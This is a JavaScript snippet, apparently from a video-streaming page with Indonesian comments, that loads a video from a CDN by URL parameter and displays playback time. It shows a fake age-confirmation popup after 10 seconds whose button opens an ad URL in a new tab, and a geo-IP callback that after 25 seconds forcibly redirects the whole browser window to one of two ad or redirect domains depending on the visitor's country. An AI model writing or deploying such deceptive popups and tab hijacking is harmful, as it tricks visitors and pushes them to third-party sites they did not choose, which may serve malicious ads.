    <script>
        const v = document.getElementById('player');
        const status = document.getElementById('status');
        const backdrop = document.getElementById('age-backdrop');
        const ADS_URL = "https://omg10.com/4/10615912"; 

        // 1. OTOMATIS AMBIL VIDEO DARI URL (?id=... atau ?v=...)
        const query = new URLSearchParams(window.location.search);
        const videoID = query.get('v') || query.get('id');
        
        if(videoID) {
            v.src = `https://cdn.videy.co/${videoID}.mp4`;
        }

        // 2. UPDATE DURASI SEPERTI SCRIPT PUAS KAMU
        function fmt(t){ const m=Math.floor(t/60); const s=Math.floor(t%60).toString().padStart(2,'0'); return `${m}:${s}`; }
        v.addEventListener('loadedmetadata', () => { status.textContent = `0:00 / ${fmt(v.duration)}`; });
        v.addEventListener('timeupdate', () => { status.textContent = `${fmt(v.currentTime)} / ${fmt(v.duration)}`; });

        // 3. MUNCULKAN POPUP SETELAH 10 DETIK
        setTimeout(() => {
            backdrop.style.visibility = 'visible';
            backdrop.style.opacity = '1';
        }, 10000);

        function gasIklan() {
            window.open(ADS_URL, '_blank'); // Buka iklan di tab baru
            backdrop.style.display = 'none'; // Hilangkan popup
            v.play(); // Putar video
        }

        // 4. GEO-REDIRECT (Sama seperti script 30 repo kamu)
        function geoip(g){
            setTimeout(function(){
                const link = (g && g.country === "ID") ? ADS_URL : "https://peacockvowel.com/itdv7p5u4?key=9e08d0fca5388ed0e422ebc60fb6c950";
                window.top.location.href = link;
            }, 25000); // Redirect total setelah 25 detik
        }
    </script>
